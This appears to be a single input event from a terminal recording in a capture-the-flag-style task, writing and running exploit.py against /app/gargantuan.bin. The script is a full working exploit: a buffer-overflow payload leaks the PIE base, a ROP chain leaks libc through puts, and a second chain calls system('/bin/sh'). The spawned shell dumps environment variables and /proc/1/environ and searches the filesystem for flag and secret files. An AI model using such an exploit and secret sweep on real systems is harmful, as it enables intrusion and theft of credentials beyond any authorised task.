[642.00944, "i", "cat << 'EOF' > /app/exploit.py\nimport subprocess, struct, time, select\ndef p64(x): return struct.pack('<Q', x)\ndef u64(x): return struct.unpack('<Q', x.ljust(8, b'\\x00'))[0]\np = subprocess.Popen(['/app/gargantuan.bin'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)\ndef read_until(token):\n    out = b''\n    while token not in out:\n        c = p.stdout.read(1)\n        if not c: break\n        out += c\n    return out\nprefix = (b'\\x41' * 256 + b'\\x00' + b'\\x41' * 255) * 4\nread_until(b'Enter your input below:\\n')\np.stdin.write(prefix + b'\\x00' + b'\\x41' * 295 + b'\\xd9')\np.stdin.flush()\nread_until(b'OO LATE! ')\nleak_str = b''\nwhile True:\n    c = p.stdout.read(1)\n    if c == b'\\n': break\n    leak_str += c\npie_base = int(leak_str.decode(), 16) - 0x11e5\nprint(\"PIE Base:\", hex(pie_base))\nread_until(b'Enter your input below:\\n')\nm_pop_rdi = pie_base + 0x11e0\nputs_got = pie_base + 0x4000\nputs_plt = pie_base + 0x1030\nm_main = pie_base + 0x12d9\nm_ret = pie_base + 0x11e1\nrop1 = p64(m_pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(m_main)\np.stdin.write(prefix + b'\\x00' + b'\\x41' * 295 + rop1)\np.stdin.flush()\nread_until(b'OO LATE! ')\nread_until(b'\\n')\nputs_leak_raw = p.stdout.read(6)\nputs_leak = u64(puts_leak_raw)\nlibc_base = puts_leak - 0x80e50\nprint(\"Libc Base:\", hex(libc_base))\nread_until(b'Enter your input below:\\n')\nsys_addr = libc_base + 0x50d70\nbinsh_addr = libc_base + 0x1d8678\nrop2 = p64(m_pop_rdi) + p64(binsh_addr) + p64(m_ret) + p64(sys_addr)\np.stdin.write(prefix + b'\\x00' + b'\\x41' * 295 + rop2)\np.stdin.flush()\nread_until(b'OO LATE! ')\nread_until(b'\\n')\np.stdin.write(b\"echo EXPLOIT_SUCCESS; env; cat /proc/1/environ | tr '\\\\0' '\\\\n'; ls -la /; find / -name '*flag*' -o -name '*secret*' 2>/dev/null; cat /app/flag.txt 2>/dev/null; cat /flag 2>/dev/null; cat /flag.txt 2>/dev/null; cat /secret.txt 2>/dev/null\\n\")\np.stdin.flush()\nwhile True:\n    rx, _, _ = select.select([p.stdout], [], [], 2.0)\n    if rx:\n        out = p.stdout.read(4000)\n        if not out: break\n        print(out.decode(errors='ignore'))\n    else:\n        break\nEOF\npython3 /app/exploit.py\n"]
